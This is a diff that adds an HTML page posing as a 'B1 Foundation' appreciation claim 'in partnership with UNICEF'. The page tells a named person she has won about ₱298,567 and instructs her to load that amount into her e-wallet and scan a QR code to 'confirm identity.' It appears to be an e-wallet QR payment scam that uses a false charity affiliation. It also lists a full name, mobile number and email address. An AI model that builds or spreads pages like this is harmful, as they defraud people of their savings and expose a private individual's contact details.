@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>B1 Foundation — Appreciation Claim</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="favicon.png" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <h1>B1 Foundation</h1>
+      <p class="partner">in partnership with <strong>UNICEF</strong></p>
+    </div>
+    <nav>
+      <a href="#about">About</a>
+      <a href="#claim">Claim</a>
+      <a href="#contact">Contact</a>
+      <a class="visit" href="https://b1-foundation.org/" target="_blank" rel="noopener">Visit Main Page</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <section class="hero glass">
+      <div class="hero-left">
+        <h2>Special Appreciation Event</h2>
+        <p class="amount">₱298,567.32 &nbsp; • &nbsp; $5,147.71</p>
+        <p class="lead">We are pleased to inform you that <strong>DESERIE MAY LANTAJO</strong> has been selected as part of our foundation appreciation event.</p>
+        <p>This celebration coincides with <strong>50 years of safeguarding Philippine biodiversity</strong>. Join us in supporting B1 Foundation together with UNICEF—together, we can nurture a healthier environment.</p>
+
+        <div class="actions">
+          <button id="claimBtn" class="primary">Claim it now</button>
+          <a class="secondary" href="#instructions">How to Claim</a>
+        </div>
+
+        <ul class="details">
+          <li><strong>Classification:</strong> 3685 3024 9075 1697</li>
+          <li><strong>Phone:</strong> 0936-396-0810</li>
+          <li><strong>Email:</strong> <a href="mailto:deseriemaylantajo@gmail.com">deseriemaylantajo@gmail.com</a></li>
+        </ul>
+      </div>
+
+      <div class="hero-right">
+        <div class="badge glass">
+          <img alt="Foundation logo" src="Untitled83_20251022003737.jpeg" />
+          <p class="sustain">🌿 Sustain life to all those in need 🌿</p>
+        </div>
+        <p class="live">Your site is live at <a href="https://b1loan.github.io/B1Foundation/" target="_blank" rel="noopener">b1loan.github.io/B1Foundation</a></p>
+      </div>
+    </section>
+
+    <section id="instructions" class="glass panel">
+      <h3>Instructions to claim</h3>
+      <ol>
+        <li>Make sure you are using your <strong>own e-wallet</strong>.</li>
+        <li>Ensure you have maximum wallet space of <strong>₱298,567.32</strong>.</li>
+        <li>Have your e-wallet ready, then <strong>scan and hold</strong> the QR code to confirm identity.</li>
+        <li>Click <em>Claim via Any-E-wallet</em> and follow the instructions in the QR modal.</li>
+      </ol>
+
+      <div class="claim-area">
+        <button id="openQr" class="qrbtn">Claim via Any‑E‑wallet (click to see QR code)</button>
+        <p class="qr-hint">Scan QR code below to confirm e-wallet identity.</p>
+      </div>
+    </section>
+
+    <section id="about" class="glass panel">
+      <h3>About the Event</h3>
+      <p>This appreciation event is organized by B1 Foundation in partnership with UNICEF to celebrate a milestone in environmental stewardship in the Philippines. Your participation helps support local conservation and community programs.</p>
+    </section>
+
+    <section id="contact" class="glass panel">
+      <h3>Contact</h3>
+      <p>If you have questions contact:</p>
+      <p><strong>DESERIE MAY LANTAJO</strong><br/>
+      0936-396-0810<br/>
+      <a href="mailto:deseriemaylantajo@gmail.com">deseriemaylantajo@gmail.com</a></p>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <p>© B1 Foundation · in partnership with UNICEF · 50 years safeguarding biodiversity</p>
+    <p class="small">This page is an informational sample. Please verify official communications on the foundation's main website.</p>
+  </footer>
+
+  <!-- QR Modal -->
+  <div id="qrModal" class="modal" aria-hidden="true">
+    <div class="modal-content glass" role="dialog" aria-modal="true" aria-labelledby="qrTitle">
+      <button id="closeModal" class="close" aria-label="Close">&times;</button>
+      <h4 id="qrTitle">Scan & Hold — Confirm E‑Wallet Identity</h4>
+      <p class="modal-instruction">Open your e-wallet app and scan the QR code below. Hold until confirmation.</p>
+      <img id="qrImg" alt="QR code to claim" src="https://raw.githubusercontent.com/b1loan/B1Foundation/35859a0da8a20804301660172fe995595bf91977/Untitled83_20251022003737.jpeg" />
+      <p class="note">If the QR image does not load, you can <a href="https://b1loan.github.io/B1Foundation/Untitled83_20251022003737.jpeg" target="_blank" rel="noopener">open it in a new tab</a>.</p>
+      <div class="modal-actions">
+        <button id="confirmClaim" class="primary">I scanned — Confirm</button>
+        <button id="cancel" class="secondary">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
